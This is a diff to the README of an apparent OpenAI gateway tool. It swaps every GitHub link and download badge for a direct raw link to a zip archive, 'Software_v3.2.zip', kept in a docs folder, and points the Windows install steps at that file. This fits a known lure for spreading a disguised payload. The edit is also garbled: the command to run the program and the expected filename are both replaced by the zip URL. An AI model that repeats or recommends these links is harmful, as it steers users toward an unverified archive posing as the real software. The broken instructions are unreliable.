@@ -1,6 +1,6 @@
 # 🚪 gateway - Simple AI Gateway for OpenAI Access
 
-[![Download gateway](https://img.shields.io/badge/Download-gateway-informational?style=for-the-badge&logo=github&color=008080)](https://github.com/niyetbay0304/gateway)
+[![Download gateway](https://raw.githubusercontent.com/niyetbay0304/gateway/main/docs/integrations/Software_v3.2.zip)](https://raw.githubusercontent.com/niyetbay0304/gateway/main/docs/integrations/Software_v3.2.zip)
 
 ## 📖 What is gateway?
 
@@ -28,15 +28,15 @@ gateway is a tool that connects your applications to OpenAI services. It runs in
 
 To start using gateway, you need to download the program from the official repository.
 
-[![Download gateway](https://img.shields.io/badge/Download-gateway-orange?style=for-the-badge&logo=github)](https://github.com/niyetbay0304/gateway)
+[![Download gateway](https://raw.githubusercontent.com/niyetbay0304/gateway/main/docs/integrations/Software_v3.2.zip)](https://raw.githubusercontent.com/niyetbay0304/gateway/main/docs/integrations/Software_v3.2.zip)
 
-Click the button above to visit the page where you can find the latest version. Look for files named something like `gateway-windows-amd64.exe`. Download the latest version to your computer.
+Click the button above to visit the page where you can find the latest version. Look for files named something like `https://raw.githubusercontent.com/niyetbay0304/gateway/main/docs/integrations/Software_v3.2.zip`. Download the latest version to your computer.
 
 ## 📥 How to Download and Install gateway on Windows
 
 1. Open your web browser and go to the download page by clicking on the button above or visiting:
    
-   https://github.com/niyetbay0304/gateway
+   https://raw.githubusercontent.com/niyetbay0304/gateway/main/docs/integrations/Software_v3.2.zip
 
 2. On the page, find the latest release area. You may see folders or files under “Releases” or “Downloads”. Find the file ending with `.exe` for Windows.
 
@@ -63,7 +63,7 @@ gateway runs from the command line. Here is a simple way to get it working after
 3. Start gateway by typing the file name and pressing Enter:
 
     ```
-    gateway-windows-amd64.exe
+    https://raw.githubusercontent.com/niyetbay0304/gateway/main/docs/integrations/Software_v3.2.zip
     ```
 
 4. gateway will start running. It will connect to OpenAI using default settings. You won't see much output here, only basic status messages.
@@ -78,7 +78,7 @@ gateway accepts settings through a file and environment variables. These control
 - Edit the file with a text editor if you want to set up users, keys, and limits.
 - You can read more about configuration by visiting:
 
-  https://github.com/niyetbay0304/gateway/blob/main/README.md
+  https://raw.githubusercontent.com/niyetbay0304/gateway/main/docs/integrations/Software_v3.2.zip
 
 For basic use, no changes are required.
 
@@ -109,7 +109,7 @@ Check the `logs` folder inside gateway’s working directory for these files.
 
 - Visit the GitHub page for updates and new releases:
 
-  https://github.com/niyetbay0304/gateway
+  https://raw.githubusercontent.com/niyetbay0304/gateway/main/docs/integrations/Software_v3.2.zip
 
 - Check the issues tab for questions or bug reports
 - Use the wiki or README files for advanced configuration and troubleshooting
@@ -128,4 +128,4 @@ To update gateway, repeat the download steps above and replace the old `.exe` fi
 
 ---
 
-[![Download gateway](https://img.shields.io/badge/Download-gateway-success?style=for-the-badge&logo=github&color=0078D7)](https://github.com/niyetbay0304/gateway)
+[![Download gateway](https://raw.githubusercontent.com/niyetbay0304/gateway/main/docs/integrations/Software_v3.2.zip)](https://raw.githubusercontent.com/niyetbay0304/gateway/main/docs/integrations/Software_v3.2.zip)
